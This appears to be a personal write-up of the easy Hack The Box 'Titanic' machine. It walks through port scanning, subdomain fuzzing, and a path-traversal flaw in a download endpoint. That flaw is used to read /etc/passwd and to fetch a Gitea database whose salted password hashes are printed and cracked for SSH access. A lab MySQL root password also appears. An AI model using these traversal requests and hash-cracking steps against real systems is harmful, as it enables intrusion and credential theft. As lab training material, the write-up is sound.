---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/htb/titanic/","tags":["#linux","#other-tags"],"dg-note-properties":{"Difficulty":"easy","tags":["#linux","#other-tags"]}}
---


# 10.10.11.55
---
# Enumeration &  Recon

## ports
```bash hl:2,6
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
```


## vhosts/subdomains

```bash hl:22
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 20
________________________________________________

dev                     [Status: 200, Size: 13870, Words: 1107, Lines: 276]

```
 also see `/etc/hosts` from lfi

## screenshots & summary
- main landing page is a simple functioning page to book a trip that downloads a json on `/download`. the download functionality has a lfi vulnerability
![Pasted image 20250501073111.png](/img/user/img/Pasted%20image%2020250501073111.png)
- `dev` vhost is a gittea instance with a docker config and the flask app source code from user`developer` as confirmed through `/etc/passwd` lfi earlier. mysql password here:![Pasted image 20250501073536.png](/img/user/img/Pasted%20image%2020250501073536.png)
## creds

**mysql**
`root:MySQLP@$$w0rd!`

# Exploitation i.e getting a foothold

## what might work
- lfi on `/download?ticket=../L/F/I`
	- `etc/passwd`
	- ![Pasted image 20250430201941.png](/img/user/img/Pasted%20image%2020250430201941.png)
	- `/etc/hosts`
	```bash hl:12
	curl -iL 'http://titanic.htb/download?ticket=../../../../../../../etc/hosts'
HTTP/1.1 200 OK
Date: Thu, 01 May 2025 11:19:40 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="../../../../../../../etc/hosts"
Content-Type: application/octet-stream
Content-Length: 250
Last-Modified: Fri, 07 Feb 2025 12:04:36 GMT
Cache-Control: no-cache
ETag: "1738929876.3570278-250-1370164657"

127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
- `/home/developer/user.txt`
- gitea docker config specifies a data path so there might be a sqlite db there according to [documentation](https://docs.gitea.com/administration/config-cheat-sheet#database-database)
	- a little bit of fuzzing on the filepath, there needs to be another gitea dir added to the path after `/data/`: `/home/developer/gitea/data/gitea/gitea.db'`
	
```bash
sqlite> select name, passwd, salt, passwd_hash_algo from user;
name|passwd|salt|passwd_hash_algo
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b|pbkdf2$50000$50

developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34|pbkdf2$50000$50

teste|33d8e4ca3300b901ced40637aa6b48f5732187ca4216f45b8f99b30ba0f848106bcef507b8151b9db72e7fdcf1fff43ae77b|8b64f8b3dbc513c1537c04a498d3cd6c|pbkdf2$50000$50

```
- so the password is salted and we can see the hash algo
- doing some searching gets us this [writeup from 0xdf](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash)
## what did
- download the sqlite db [here](http://titanic.htb/download?ticket=../../../../../../../home/developer/gitea/data/gitea/gitea.db)
- open the db with sqlite3
- `select * from user;`
- start cracking hash for `developer`
- ssh as `developer`

```bash
proof of shell
```
# Post Exploitation i.e. privsec
## what worked
- `sudo -l`
- `sudo su`

![Pasted image 20250502102521.png](/img/user/img/Pasted%20image%2020250502102521.png)

---